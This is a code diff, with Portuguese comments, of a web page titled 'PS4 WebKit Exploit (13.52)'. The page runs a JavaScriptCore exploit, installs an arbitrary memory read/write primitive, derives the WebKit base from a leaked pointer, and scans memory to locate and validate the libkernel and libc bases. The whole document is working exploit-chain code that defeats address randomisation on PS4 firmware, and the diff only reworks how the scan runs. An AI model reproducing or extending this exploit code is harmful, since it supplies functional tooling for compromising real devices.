@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Memory Scan)</title>
+<title>PS4 WebKit Exploit (13.52)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -23,7 +23,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
-/* console */
 #con{width:100%;max-width:720px;height:340px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
@@ -32,7 +31,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 .s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
   padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}
 
-/* cards */
 #cards{width:100%;max-width:720px;display:grid;
   grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
 .card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
@@ -40,7 +38,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 .card .cv{font-size:12px;color:#bd93f9}
 .card .cv.na{color:#222}
 
-/* constants output box */
 #cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
   border-radius:6px;padding:12px;display:none;margin-bottom:8px;
   font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
@@ -73,7 +70,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </div>
 
 <div id="cbox">
-  <div class="ct">// ═══════ PS4 FW 13.52 — Memory Scan Results ═══════</div>
+  <div class="ct">// ═══════ PS4 FW 13.52 — Scan Results ═══════</div>
   <div id="c-out"></div>
 </div>
 
@@ -106,115 +103,101 @@ function setCard(id, v) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// VARREDURA DE PONTEIROS NA MEMÓRIA DO WEBKIT
-// Estratégia: varrer a seção .data do WebKit procurando por ponteiros
-// que apontem para libkernel (hi=0x80) e libc (hi=0x90-0x98).
+// VARREDURA SEGURA EM CHUNKS ASSÍNCRONOS
 // ═════════════════════════════════════════════════════════════════════════════
 
-async function scanForBases(p, webkitBase) {
-  logH('VARREDURA DE PONTEIROS NO WEBKIT');
+const SCAN_START   = 0x200000;   // 2MB offset
+const SCAN_END     = 0x600000;   // 6MB offset (total 4MB)
+const STEP         = 0x100;      // 256 bytes — mais rápido, menos preciso
+const CHUNK_SIZE   = 0x8000;     // 32KB por chunk (evita bloqueio)
+const MAX_CANDS    = 10;
+const MAX_SCAN_BACK = 0x400000;
 
-  // Range de varredura: .data/.bss típica do WebKit
-  // Ajustável conforme necessário
-  const SCAN_START = 0x2800000;
-  const SCAN_END   = 0x3A00000;
-  const STEP       = 8;        // ponteiros 64-bit alinhados
-  const MAX_CANDS  = 20;       // limitar candidatos
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
 
-  let libkernelCands = [];
-  let libcCands = [];
-  let scanned = 0;
-
-  for (let off = SCAN_START; off < SCAN_END; off += STEP) {
-    scanned++;
-
-    // Log de progresso a cada 0x80000 bytes (~512KB)
-    if ((off & 0x7FFFF) === 0) {
-      let pct = Math.floor((off - SCAN_START) * 100 / (SCAN_END - SCAN_START));
-      setStatus('Varrendo memória... ' + pct + '%');
-    }
+async function scanChunk(p, webkitBase, startOff, endOff, lkCands, lcCands) {
+  for (let off = startOff; off < endOff; off += STEP) {
+    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) return;
 
     try {
       let ptr = p.read8(webkitBase.add32(off));
       let hi = ptr.hi;
       let lo = ptr.low;
 
-      // Pular nulos e não-alinhados
       if (lo === 0 && hi === 0) continue;
       if ((lo & 0x7) !== 0) continue;
 
-      // libkernel: hi = 0x80
-      if (hi === 0x80 && libkernelCands.length < MAX_CANDS) {
-        // Verificar se a memória apontada é legível
-        try {
-          let testByte = p.read8(ptr); // ler 1 byte é suficiente
-          libkernelCands.push({off, ptr});
-        } catch(e) {}
+      if (hi === 0x80 && lkCands.length < MAX_CANDS) {
+        try { p.read8(ptr); lkCands.push({off, ptr}); } catch(e) {}
       }
-      // libc: hi = 0x90 a 0x98
-      else if (hi >= 0x90 && hi <= 0x98 && libcCands.length < MAX_CANDS) {
-        try {
-          let testByte = p.read8(ptr);
-          libcCands.push({off, ptr});
-        } catch(e) {}
+      else if (hi >= 0x90 && hi <= 0x98 && lcCands.length < MAX_CANDS) {
+        try { p.read8(ptr); lcCands.push({off, ptr}); } catch(e) {}
       }
-    } catch(e) {
-      // Memória não mapeada, pular
-    }
-
-    // Early exit se já temos candidatos suficientes
-    if (libkernelCands.length >= MAX_CANDS && libcCands.length >= MAX_CANDS) break;
+    } catch(e) {}
   }
-
-  log('[+] Varredura completa: ' + scanned + ' ponteiros verificados');
-  log('[+] ' + libkernelCands.length + ' candidatos libkernel (hi=0x80)');
-  log('[+] ' + libcCands.length + ' candidatos libc (hi=0x90-0x98)');
-
-  // Logar primeiros candidatos para debug
-  for (let i = 0; i < Math.min(5, libkernelCands.length); i++) {
-    let c = libkernelCands[i];
-    log('    lk-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
-  }
-  for (let i = 0; i < Math.min(5, libcCands.length); i++) {
-    let c = libcCands[i];
-    log('    lc-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
-  }
-
-  // ─── Encontrar base da libkernel ───
-  let libkernelBase = null;
-  for (let cand of libkernelCands) {
-    let base = findElfBase(p, cand.ptr, 0x400000);
-    if (base) {
-      libkernelBase = base;
-      log('[+] libkernel base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
-      break;
-    }
-  }
-
-  // ─── Encontrar base da libc ───
-  let libcBase = null;
-  for (let cand of libcCands) {
-    let base = findElfBase(p, cand.ptr, 0x400000);
-    if (base) {
-      libcBase = base;
-      log('[+] libc base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
-      break;
-    }
-  }
-
-  return { libkernelBase, libcBase, libkernelCands, libcCands };
 }
 
-// Varre para trás em páginas de 0x1000 procurando \x7fELF
-function findElfBase(p, startPtr, maxBack) {
-  for (let back = 0; back < maxBack; back += 0x1000) {
+async function scanForBases(p, webkitBase) {
+  logH('VARREDURA SEGURA DE PONTEIROS');
+  log('[+] Range: 0x' + SCAN_START.toString(16) + ' - 0x' + SCAN_END.toString(16));
+  log('[+] Step: 0x' + STEP.toString(16) + ' | Chunk: 0x' + CHUNK_SIZE.toString(16));
+
+  let lkCands = [];
+  let lcCands = [];
+  let totalChunks = Math.ceil((SCAN_END - SCAN_START) / CHUNK_SIZE);
+
+  for (let i = 0; i < totalChunks; i++) {
+    let chunkStart = SCAN_START + i * CHUNK_SIZE;
+    let chunkEnd = Math.min(chunkStart + CHUNK_SIZE, SCAN_END);
+
+    await scanChunk(p, webkitBase, chunkStart, chunkEnd, lkCands, lcCands);
+
+    // Progresso
+    let pct = Math.floor((i + 1) * 100 / totalChunks);
+    setStatus('Varrendo... ' + pct + '%');
+
+    // Respirar a cada chunk para não travar o navegador
+    await sleep(10);
+
+    // Early exit
+    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) {
+      log('[+] Early exit: candidatos suficientes');
+      break;
+    }
+  }
+
+  log('[+] lk-cands: ' + lkCands.length + ' | lc-cands: ' + lcCands.length);
+
+  for (let i = 0; i < Math.min(3, lkCands.length); i++) {
+    log('  lk[' + i + '] off=0x' + lkCands[i].off.toString(16) + ' ptr=0x' + lkCands[i].ptr.toString(16), 'd');
+  }
+  for (let i = 0; i < Math.min(3, lcCands.length); i++) {
+    log('  lc[' + i + '] off=0x' + lcCands[i].off.toString(16) + ' ptr=0x' + lcCands[i].ptr.toString(16), 'd');
+  }
+
+  let libkernelBase = null;
+  for (let c of lkCands) {
+    let base = findElfBase(p, c.ptr);
+    if (base) { libkernelBase = base; log('[+] libkernel: 0x' + base.toString(16), 'ok'); break; }
+  }
+
+  let libcBase = null;
+  for (let c of lcCands) {
+    let base = findElfBase(p, c.ptr);
+    if (base) { libcBase = base; log('[+] libc: 0x' + base.toString(16), 'ok'); break; }
+  }
+
+  return { libkernelBase, libcBase, lkCands, lcCands };
+}
+
+function findElfBase(p, startPtr) {
+  for (let back = 0; back < MAX_SCAN_BACK; back += 0x1000) {
     try {
       let test = startPtr.sub32(back);
       if (p.read32(test) === 0x464C457F) {
-        // Verificar se é realmente um ELF64 válido
-        let e_class = p.read8(test.add32(4));
-        let e_machine = p.read16(test.add32(0x12));
-        if (e_class === 2 && e_machine === 0x3E) {
+        if (p.read8(test.add32(4)) === 2 && p.read16(test.add32(0x12)) === 0x3E) {
           return test;
         }
       }
@@ -224,7 +207,7 @@ function findElfBase(p, startPtr, maxBack) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// VALIDAÇÃO DE BASES
+// VALIDAÇÃO
 // ═════════════════════════════════════════════════════════════════════════════
 
 async function validateBases(p, libkernelBase, libcBase) {
@@ -232,56 +215,52 @@ async function validateBases(p, libkernelBase, libcBase) {
   let valid = { libkernel: false, libc: false };
 
   if (libkernelBase) {
-    let magic = p.read32(libkernelBase);
-    let elfClass = p.read8(libkernelBase.add32(4));
-    let machine = p.read16(libkernelBase.add32(0x12));
-
-    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
-      log('[✓] libkernel: ELF64 x86_64 válido', 'ok');
-      valid.libkernel = true;
-    } else {
-      log('[✗] libkernel: ELF inválido (magic=0x' + magic.toString(16) + ' class=' + elfClass + ' machine=0x' + machine.toString(16) + ')', 'e');
-    }
+    let ok = true;
+    try {
+      let magic = p.read32(libkernelBase);
+      let cls = p.read8(libkernelBase.add32(4));
+      let mach = p.read16(libkernelBase.add32(0x12));
+      if (magic === 0x464C457F && cls === 2 && mach === 0x3E) {
+        log('[✓] libkernel: ELF64 x86_64', 'ok'); valid.libkernel = true;
+      } else { ok = false; }
+    } catch(e) { ok = false; }
+    if (!ok) log('[✗] libkernel: ELF inválido', 'e');
 
     let aligned = (libkernelBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libkernel: alinhada a 0x1000' : '[✗] libkernel: desalinhada', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libkernel: page-aligned' : '[✗] libkernel: misaligned', aligned ? 'ok' : 'w');
     if (!aligned) valid.libkernel = false;
 
-    // Procurar stubs de syscall
     let stubs = 0;
     for (let off = 0; off < 0x100000; off += 0x10) {
       try {
-        let b = [];
-        for (let j = 0; j < 10; j++) b.push(p.read8(libkernelBase.add32(off + j)));
-        if (b[0] === 0x48 && b[1] === 0xC7 && b[2] === 0xC0 &&
-            b[7] === 0x49 && b[8] === 0x89 && b[9] === 0xCA) {
-          stubs++;
-          if (stubs >= 3) break;
+        let b0 = p.read8(libkernelBase.add32(off));
+        let b1 = p.read8(libkernelBase.add32(off + 1));
+        let b2 = p.read8(libkernelBase.add32(off + 2));
+        let b7 = p.read8(libkernelBase.add32(off + 7));
+        let b8 = p.read8(libkernelBase.add32(off + 8));
+        let b9 = p.read8(libkernelBase.add32(off + 9));
+        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0 && b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
+          stubs++; if (stubs >= 3) break;
         }
       } catch(e) {}
     }
-    if (stubs >= 3) {
-      log('[✓] libkernel: ' + stubs + ' stubs de syscall', 'ok');
-    } else {
-      log('[✗] libkernel: apenas ' + stubs + ' stubs', 'w');
-      valid.libkernel = false;
-    }
+    if (stubs >= 3) log('[✓] libkernel: ' + stubs + ' syscall stubs', 'ok');
+    else { log('[✗] libkernel: ' + stubs + ' stubs', 'w'); valid.libkernel = false; }
   }
 
   if (libcBase) {
-    let magic = p.read32(libcBase);
-    let elfClass = p.read8(libcBase.add32(4));
-    let machine = p.read16(libcBase.add32(0x12));
-
-    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
-      log('[✓] libc: ELF64 x86_64 válido', 'ok');
-      valid.libc = true;
-    } else {
-      log('[✗] libc: ELF inválido', 'e');
-    }
+    let ok = true;
+    try {
+      let magic = p.read32(libcBase);
+      let cls = p.read8(libcBase.add32(4));
+      if (magic === 0x464C457F && cls === 2) {
+        log('[✓] libc: ELF64', 'ok'); valid.libc = true;
+      } else { ok = false; }
+    } catch(e) { ok = false; }
+    if (!ok) log('[✗] libc: ELF inválido', 'e');
 
     let aligned = (libcBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libc: alinhada a 0x1000' : '[✗] libc: desalinhada', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libc: page-aligned' : '[✗] libc: misaligned', aligned ? 'ok' : 'w');
     if (!aligned) valid.libc = false;
   }
 
@@ -298,7 +277,7 @@ async function main() {
   $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
   log('UA: ' + ua, 'd');
 
-  setStatus('Rodando exploit JSC (core.js)...', 'r');
+  setStatus('Rodando exploit JSC...', 'r');
   logH('EXPLOIT JSC (WebKit)');
 
   let carrier;
@@ -317,17 +296,15 @@ async function main() {
     return;
   }
 
-  log('[+] core.js: exploit JSC concluído!', 'ok');
-  setStatus('Instalando R/W arbitrário...', 'r');
-  logH('INSTALANDO PRIMITIVA R/W (mem.js)');
+  log('[+] core.js: concluído!', 'ok');
+  setStatus('Instalando R/W...', 'r');
+  logH('INSTALANDO R/W (mem.js)');
 
   let p;
   try {
     p = installWindowP(carrier, {
       promote: true,
-      onEvent: (tag, detail) => {
-        log(`  [mem/${tag}] ${detail}`, 'd');
-      }
+      onEvent: (tag, detail) => { log(`  [mem/${tag}] ${detail}`, 'd'); }
     });
   } catch (err) {
     setStatus('mem.js falhou: ' + err.message, 'e');
@@ -335,76 +312,69 @@ async function main() {
     return;
   }
 
-  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Varrendo memória...', 'r');
+  log('[+] R/W arbitrário ativo!', 'ok');
+  setStatus('Calculando WebKit base...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor === 'number' && ctor > 0x100000000) {
-    const hi = Math.floor(ctor / 0x100000000);
-    const lo = ctor - hi * 0x100000000;
-    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
-
-    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');
-
-    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
-               ? OFFSET_wk_host_constructor_candidates[0]
-               : 0x36F9E20;
-
-    const resolvedBaseVal = ctor - hc;
-    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
-    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
-    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
-
-    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
-    setCard('c-wk', '0x' + webkitBase.toString(16));
-
-    // ─── Varredura de ponteiros ───
-    setTimeout(async () => {
-      const result = await scanForBases(p, webkitBase);
-      const libKernelBase = result.libkernelBase;
-      const libcBase = result.libcBase;
-
-      if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString(16));
-      if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));
-
-      // Validar
-      const valid = await validateBases(p, libKernelBase, libcBase);
-
-      if (valid.libkernel && valid.libc) {
-        log('[✓] Todas as bases validadas!', 'ok');
-        setStatus('Bases mapeadas com sucesso', 'ok');
-        setCard('c-g', 'Pronto');
-
-        const cbox = document.getElementById('cbox');
-        cbox.style.display = 'block';
-        document.getElementById('c-out').textContent =
-            '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
-            'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
-            'libkernel Base   = 0x' + libKernelBase.toString(16) + '\n' +
-            'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
-            'Status           = Varredura concluída com sucesso.';
-      } else {
-        setStatus('Validação falhou', 'e');
-        setCard('c-g', 'Falha');
-
-        // Debug: mostrar candidatos mesmo se validação falhar
-        logH('CANDIDATOS PARA DEBUG');
-        log('libkernel candidatos:', 'w');
-        for (let c of result.libkernelCands.slice(0, 5)) {
-          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
-        }
-        log('libc candidatos:', 'w');
-        for (let c of result.libcCands.slice(0, 5)) {
-          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
-        }
-      }
-    }, 500);
-
-  } else {
-    log('[-] __ps5NativeCtor não capturado.', 'e');
-    setStatus('Erro ao capturar NativeCtor', 'e');
+  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
+    log('[-] __ps5NativeCtor inválido', 'e');
+    setStatus('Erro NativeCtor', 'e');
+    return;
   }
+
+  const hi = Math.floor(ctor / 0x100000000);
+  const lo = ctor - hi * 0x100000000;
+  const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
+  log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');
+
+  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
+             ? OFFSET_wk_host_constructor_candidates[0]
+             : 0x36F9E20;
+
+  const resolvedBaseVal = ctor - hc;
+  const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
+  const baseLo = resolvedBaseVal - baseHi * 0x100000000;
+  const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+
+  log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
+  setCard('c-wk', '0x' + webkitBase.toString(16));
+
+  // ─── Varredura segura ───
+  setTimeout(async () => {
+    const result = await scanForBases(p, webkitBase);
+    const libKernelBase = result.libkernelBase;
+    const libcBase = result.libcBase;
+
+    if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString(16));
+    if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));
+
+    const valid = await validateBases(p, libKernelBase, libcBase);
+
+    if (valid.libkernel && valid.libc) {
+      log('[✓] Bases validadas!', 'ok');
+      setStatus('Bases mapeadas!', 'ok');
+      setCard('c-g', 'Pronto');
+
+      document.getElementById('cbox').style.display = 'block';
+      document.getElementById('c-out').textContent =
+          '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
+          'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
+          'libkernel Base   = 0x' + libKernelBase.toString(16) + '\n' +
+          'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
+          'Status           = Scan concluído com sucesso.';
+    } else {
+      setStatus('Validação falhou', 'e');
+      setCard('c-g', 'Falha');
+      logH('DEBUG CANDIDATOS');
+      for (let c of result.lkCands.slice(0, 5)) {
+        log('  lk off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+      }
+      for (let c of result.lcCands.slice(0, 5)) {
+        log('  lc off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+      }
+    }
+  }, 500);
 }
 
 main();
